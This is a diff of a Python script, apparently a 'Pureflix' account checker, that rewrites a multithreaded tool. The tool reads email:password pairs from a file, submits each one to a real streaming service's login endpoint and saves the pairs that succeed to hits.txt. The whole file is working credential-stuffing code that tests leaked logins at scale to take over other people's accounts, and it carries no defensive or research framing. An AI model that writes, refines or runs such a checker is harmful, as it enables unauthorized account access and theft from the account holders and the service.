@@ -1,89 +1,62 @@
 import requests
-import sys
+import concurrent.futures
 from concurrent.futures import ThreadPoolExecutor, as_completed
-import colorama
-from colorama import Fore
-import threading
+from threading import Lock
+import time
 
+lock = Lock()
 
-
-
-
-print(f""" {Fore.BLUE}
-_________                      _____.__  .__        
-\______   \__ _________   _____/ ____\  | |__|__  ___
- |     ___/  |  \_  __ \_/ __ \   __\|  | |  \  \/  /
- |    |   |  |  /|  | \/\  ___/|  |  |  |_|  |>    < 
- |____|   |____/ |__|    \___  >__|  |____/__/__/\_ \
-                             \/                    \/                                                     
-""")
-
-
-
-
-
-
-
-def pureflix_checker(session, email, password, hits_file, lock):
-    url = 'https://login-flow.applicaster.com/auth/password/_3e74de5a-9ed4-4b6f-834a-4a7d7e2d752a_1ba339c9-b46b-4d04-91c2-d9a2a8c0ab25_undefined_undefined/login?flowType=password&_data=routes%2Fauth%2F%24flowType%2F%24uuid%2Flogin'
-
-    payload = {
-        'email': email,
-        'password': password
-    }
-
+def pureflix_checker(session, email, password, lock, hits_file):
     try:
-        r = session.post(url, data=payload, timeout=5)
-        if r.status_code == 200:
+        response = session.post("https://login-flow.applicaster.com/auth/password/_3e74de5a-9ed4-4b6f-834a-4a7d7e2d752a_1ba339c9-b46b-4d04-91c2-d9a2a8c0ab25_undefined_undefined/login?flowType=password&_data=routes%2Fauth%2F%24flowType%2F%24uuid%2Flogin", json={"email": email, "password": password})
+        if response.status_code == 200:
             with lock:
                 hits_file.write(f"{email}:{password}\n")
-            return f"{email}:{password}"
-        else:
-            return None
-    except requests.RequestException:
-        return None
+                hits_file.flush()
+    except Exception as e:
+        print(f"An error occurred while checking {email}:{password}: {e}")
+
+def print_progress(total, completed, lock, last_print_time):
+    current_time = time.time()
+    if current_time - last_print_time >= 1:  # print progress every 1 second
+        with lock:
+            print(f"Completed {completed}/{total} tasks")
+        return current_time
+    return last_print_time
 
 def main():
-    session = requests.Session()
+    try:
+        hits_file = open("hits.txt", "a")
+        lock = Lock()
+        last_print_time = time.time()
 
-    accounts = []
-    with open('accounts.txt', 'r') as file:
-        for line in file:
-            line = line.strip()
-            if ':' in line:
-                email, password = line.split(':')
-                accounts.append((email.strip(), password.strip()))
+        try:
+            with open("accounts.txt", "r") as f:
+                accounts = [line.strip().split(":") for line in f.readlines()]
+        except FileNotFoundError:
+            print("accounts.txt file not found.")
+            return
+        except Exception as e:
+            print(f"An error occurred while reading accounts.txt: {e}")
+            return
 
-    total_accounts = len(accounts)
-    valid_count = 0
-    invalid_count = 0
+        total_tasks = len(accounts)
+        completed_tasks = 0
 
-    lock = threading.Lock()
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            futures = {executor.submit(pureflix_checker, requests.Session(), email, password, lock, hits_file): (email, password) for email, password in accounts}
 
-    def print_progress():
-        print(f"\rVerificando cuentas... {valid_count} válidas | {invalid_count} inválidas | Progreso: {valid_count + invalid_count}/{total_accounts}", end="", flush=True)
+            while futures:
+                done, pending = concurrent.futures.wait(futures, return_when=concurrent.futures.FIRST_COMPLETED)
+                for future in done:
+                    email, password = futures.pop(future)
+                    completed_tasks += 1
+                    last_print_time = print_progress(total_tasks, completed_tasks, lock, last_print_time)
 
-    with open('hits.txt', 'w') as hits_file:
-        with ThreadPoolExecutor(max_workers=20) as executor:
-            futures = []
-            for email, password in accounts:
-                future = executor.submit(pureflix_checker, session, email, password, hits_file, lock)
-                future.add_done_callback(lambda _: print_progress())
-                futures.append(future)
-
-            for future in as_completed(futures):
-                result = future.result()
-                if result:
-                    valid_count += 1
-                else:
-                    invalid_count += 1
-
-            print_progress()
-            print("\n\nVerificación completada.")
-
-    print(f"Total cuentas válidas: {valid_count}")
-    print(f"Total cuentas no válidas: {invalid_count}")
-    enter = input('Press enter to exit....')
+    except Exception as e:
+        print(f"An error occurred: {e}")
+    finally:
+        hits_file.close()
 
 if __name__ == "__main__":
     main()
